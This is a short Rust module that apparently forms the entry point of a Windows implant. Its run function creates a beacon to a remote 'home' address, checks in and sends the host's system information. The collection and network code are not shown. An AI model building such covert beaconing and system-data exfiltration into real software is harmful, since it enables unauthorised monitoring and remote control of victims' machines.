mod beacon;
pub mod collector;

use std::net::SocketAddrV4;

pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
    let mut beacon = beacon::Beacon::new(home)?;
    beacon.send_initial_request()?;

    beacon.send_system_info()?;

    Ok(())
}
